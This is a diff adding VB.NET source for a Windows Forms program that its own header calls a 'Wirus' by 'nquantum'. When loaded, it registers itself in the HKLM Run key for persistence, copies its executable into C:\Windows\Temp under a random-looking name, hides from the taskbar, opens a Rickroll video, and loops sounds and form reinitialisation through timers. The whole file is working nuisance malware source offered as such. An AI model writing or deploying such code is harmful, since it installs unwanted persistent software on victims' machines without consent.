@@ -1,0 +1,68 @@
+Imports System.IO
+
+' Wirus made by nquantum / all rights reserved. (a;;e)
+'                                   _                   
+'                                  | |                  
+'     _ __   __ _ _   _  __ _ _ __ | |_ _   _ _ __ ___  
+'    | '_ \ / _` | | | |/ _` | '_ \| __| | | | '_ ` _ \ 
+'    | | | | (_| | |_| | (_| | | | | |_| |_| | | | | | |
+'    |_| |_|\__, |\__,_|\__,_|_| |_|\__|\__,_|_| |_| |_|
+'             | |                                      
+'             |_|                                      
+' Wirus made by nquantum / all rights reserved. (a;;e)
+
+
+
+Public Class Form1
+
+
+
+
+    Protected Overrides ReadOnly Property CreateParams As CreateParams
+        Get
+            Dim cp = MyBase.CreateParams
+            cp.ExStyle = cp.ExStyle Or &H80
+            Return cp
+        End Get
+    End Property
+    Private Sub Form1()
+
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
+        Me.TransparencyKey = BackColor
+        Process.Start("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        Dim sourcepath As String = "C:\Users\CurrentUser\Downloads\youtube"
+        Dim DestPath As String = "C:\Users\Deafult"
+        Timer2.Start()
+        Dim FileToCopy As String
+        Dim NewCopy As String
+
+        FileToCopy = Application.ExecutablePath
+        NewCopy = "C:\Windows\Temp\hcku485922502t53.exe"
+
+        If System.IO.File.Exists(FileToCopy) = True Then
+
+            System.IO.File.Copy(FileToCopy, NewCopy)
+
+        End If
+
+    End Sub
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        My.Computer.Audio.Play(My.Resources.gas, AudioPlayMode.Background)
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        InitializeComponent()
+    End Sub
+
+    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
+        My.Computer.Audio.Play(My.Resources.bass, AudioPlayMode.Background)
+    End Sub
+
+    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
+        My.Computer.Audio.Play(My.Resources.pis, AudioPlayMode.Background)
+    End Sub
+End Class
